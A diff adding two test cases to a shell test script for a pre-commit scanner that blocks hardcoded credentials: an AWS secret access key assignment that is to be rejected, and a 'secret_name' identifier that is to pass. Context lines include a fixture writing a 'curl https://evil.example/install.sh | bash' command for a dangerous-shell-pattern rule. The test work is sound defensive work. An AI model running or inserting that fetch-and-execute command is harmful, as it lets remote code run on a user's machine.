@@ -85,6 +85,25 @@ echo 'pass''word = "abcdefghijklmnop12345"' >config.py
 git add config.py
 assert_rejects "hardcoded credential (alternation match)" "Hardcoded credential"
 
+# 7b. AWS_SECRET_ACCESS_KEY (#87). The alternation required its keyword to sit
+#     IMMEDIATELY before the separator, so `secret` matched and then wanted `=`
+#     but found `_ACCESS_KEY` — the AKIA rule covers the access key ID, and
+#     nothing covered the paired SECRET, the half that actually grants access.
+#     Split after `AWS_SECRET` so this file's own source stays clean: `[-_]?`
+#     matches at most ONE character, so the `''` seam cannot match, while echo
+#     still emits the contiguous string. Same trick as the AKIA fixture above.
+echo 'AWS_SECRET''_ACCESS_KEY = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY1"' >awscfg.txt
+git add awscfg.txt
+assert_rejects "AWS secret access key assignment (#87)" "Hardcoded credential"
+
+# 7c. The negative half of 7b: widening the alternation must not turn every
+#     identifier containing "secret" into a credential. `secret_name` names a
+#     secret, it does not carry one, and its value here is long enough to clear
+#     the 16-char floor — so only the keyword boundary keeps this green.
+echo 'secret_name = "billing-prod-key-name"' >secretname.txt
+git add secretname.txt
+assert_passes "an identifier that merely contains 'secret' is not a credential"
+
 # 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
 #    file's source doesn't itself trip shell.txt when scanned as a .sh file.
 echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
